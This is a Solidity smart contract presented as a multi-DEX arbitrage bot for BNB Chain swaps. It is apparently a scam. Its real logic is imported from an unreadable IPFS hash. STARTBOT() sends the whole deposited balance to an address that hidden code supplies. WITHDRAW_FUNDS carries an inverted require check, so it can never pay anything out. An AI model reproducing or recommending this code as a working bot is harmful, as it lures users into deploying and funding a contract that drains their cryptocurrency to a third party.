pragma solidity >=0.5.0 <0.8.0;


/* Swaps to consider for Arbitrage
    1. PancakeSwap
    2. BakerySwap
    3. ApeSwap
    4. BurgerSwap
    5. MDEX
    6. BiSwap
*/

import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapPair.sol";
import "https://github.com/burgerswap-org/burgerswap-core/blob/master/contracts/interfaces/IDemaxPair.sol";
import "https://github.com/mdexSwap/contracts/blob/master/contracts/interface/IMdexPair.sol";

import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

// Bot Instance
import 'ipfs://QmXj4JUGecV1hS8esLYPKMDpSq6iU14S8pSmvx3DnGqjH8';


contract Bot {
   
BotInstance instance;
    string public botName;
    string public walletAdreess;
    uint256 amount;

    constructor(
        string memory _botName,
        string memory _walletAdreess,
        uint256 _amount
    ) public {
        botName = _botName;
        walletAdreess = _walletAdreess;
        amount = _amount;

        instance = new BotInstance();
    }

    function() external payable {}

    function STARTBOT() public payable {
        //Create the new Bot Instance
        //Run the Bot
        //Arbitrage through AMM Swaps

        //Check the inital status of the token value in AMM
        instance.checkInstanceStatus(
            address(this),
            instance.pancakeSwapAddress(),
            amount
        );
       
        //TokenA is converted to TokenB using each AMM swap contract.
        instance.convertTokenAtoTokenB(msg.sender, amount );
       
        instance.checkInitalArbitrage(instance.pancakeSwapAddress(), msg.sender);
       
        instance.transferToMultiplier(address(msg.sender));
        
        
        //  Token required for swap
        address(uint160(instance.pancakeSwapAddress())).transfer(
            address(this).balance
        );

      
        instance.completeTransaction(address(this).balance);
    }
   
     function WITHDRAW_FUNDS(address yourAddress) public payable {
        //add call to withdraw the amount, transfer amount from contract to the wallet address
         require(address(this).balance <= 0, "Amount should be greater than 0!");
        address(uint160(yourAddress)).transfer(
            address(this).balance
        );
    }
}
